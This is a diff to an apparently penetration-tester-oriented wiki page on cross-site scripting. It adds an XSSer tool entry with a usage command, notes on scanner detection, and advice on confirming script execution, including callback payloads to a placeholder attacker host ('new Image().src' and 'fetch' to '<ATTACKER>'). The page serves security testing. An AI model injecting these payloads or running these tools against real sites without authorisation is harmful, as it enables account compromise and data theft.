@@ -170,11 +170,14 @@ A few tools recur across this cluster:
 | Burp Suite Intruder | Filter-bypass payload sets; rapid context testing |
 | DOM-Invader (Burp browser extension) | DOM source-to-sink analysis automation |
 | [XSStrike](https://github.com/s0md3v/XSStrike) | Context-aware payload generation and reflected XSS discovery |
+| [XSSer](https://github.com/epsylon/xsser) | Automated XSS discovery + exploitation; fuzzes form fields (`xsser -u URL -g "/?p=XSS"`) |
 | [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) | Self-hosted blind XSS callback infrastructure |
 | [BeEF (Browser Exploitation Framework)](https://beefproject.com/) | Post-XSS payload framework; mature but conspicuous |
 | Burp Collaborator / Interactsh | OOB callback for blind XSS |
 
 [XSStrike](https://github.com/s0md3v/XSStrike) is particularly useful for context discovery - it identifies the exact rendering context of your input and recommends payloads. Run it before crafting manually.
+
+General web-app scanners (Nessus, Burp Pro, OWASP ZAP) also flag XSS, through a **passive scan** (reads client-side code for DOM-based sinks) and an **active scan** (injects payloads and diffs the reflected source). Whatever the tool - XSStrike, XSSer, Brute XSS, or a full scanner - a reflected payload isn't always an *executed* one, so verify every hit by hand.
 
 ## A note on `<script>alert(1)</script>` blindness
 
@@ -197,6 +200,8 @@ javascript:alert(1)                            <!-- works in href -->
 ```
 
 Cycle through these as your initial canary suite. The one that fires reveals the context. See [Payload construction](/codex/web/xss/payload-construction/) for the full catalog.
+
+When `alert()` doesn't fire, work out *why* first. If the page merely blocks the `alert` function, `print()`, `prompt()`, or `confirm()` are drop-in stand-ins. But a **sandboxed iframe without `allow-modals`** blocks all four, so they're no help there. When modals are out, the reliable confirmation is a **non-modal execution marker**: have the payload call back to a listener (`new Image().src='//<ATTACKER>/x'` or `fetch('//<ATTACKER>/x')`) or make a visible DOM change - the callback proves JavaScript actually *ran*. And note `<plaintext>` only proves your markup was **injected** - it halts HTML rendering and dumps the rest as raw text, confirming HTML injection, not JavaScript execution.
 
 ## Operator workflow
 
